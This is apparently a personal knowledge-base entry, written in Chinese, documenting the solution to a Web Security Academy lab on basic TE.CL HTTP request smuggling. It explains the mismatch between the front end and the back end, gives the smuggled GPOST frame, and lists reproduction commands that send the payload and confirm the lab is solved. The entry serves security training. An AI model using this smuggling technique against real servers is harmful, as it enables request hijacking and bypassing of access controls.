---
title: "lab-basic-te-cl"
links:
  - target: request-smuggling-family
    relation: evidences
---

# lab-basic-te-cl

> evidences: [[request-smuggling-family]]

- 题面:HTTP request smuggling, basic TE.CL vulnerability(/web-security/request-smuggling/lab-basic-te-cl)
- 实例:https://0add00b003a606e280bafd7500c9006c.web-security-academy.net
- 判定目标:走私使后端处理方法 `GPOST`;状态:**solved**

## 关键步

1. 前端用 `Transfer-Encoding: chunked`、后端用 `Content-Length`。
2. 帧:`--te-cl '<完整 GPOST 请求>'`,构造为
   `POST / ... Content-Length: 4 ... Transfer-Encoding: chunked ... \r\n\r\n{hex(len)}\r\n<GPOST 请求>\r\n0\r\n\r\n`。
   后端(CL=4)只读 `{hex}\r\n`,其余 `GPOST / HTTP/1.1...` 成为下一请求 → 403。
3. 单帧即收口(后端直接处理走私请求);响应 `200` 是 `POST /` 的,走私 403 在 academy 侧触发。

## 证据摘录

```
conn_reuse <inst> --te-cl 'GPOST / HTTP/1.1\r\nHost: <inst>\r\nContent-Length: 5\r\n\r\nabcde'
 -> HTTP/1.1 200 OK (首请求);solved_check -> {"solved":true}
```

## 复现命令

```
lab_launch launch A6AECBC5C1D7F95E7512642A6F11FCB8C5D568F7CD57AE0CE60A08C7140583B3 --widget-source /web-security/request-smuggling --jar <jar>
conn_reuse "https://<inst>" --te-cl 'GPOST / HTTP/1.1\r\nHost: <inst>\r\nContent-Length: 5\r\n\r\nabcde' --read-ms 3000
solved_check "https://<inst>/" --jar <jar>
```

## 回马复核

- 新实例 `0a2c00b204fc5a8e818439e1004f00bc`(lab_id 与本档一致)。
- 单帧 `--te-cl 'GPOST / HTTP/1.1\r\nHost: <inst>\r\nContent-Length: 5\r\n\r\nabcde'` → 200(首请求回包);
  `solved_check` → `{"solved":true,…}`。

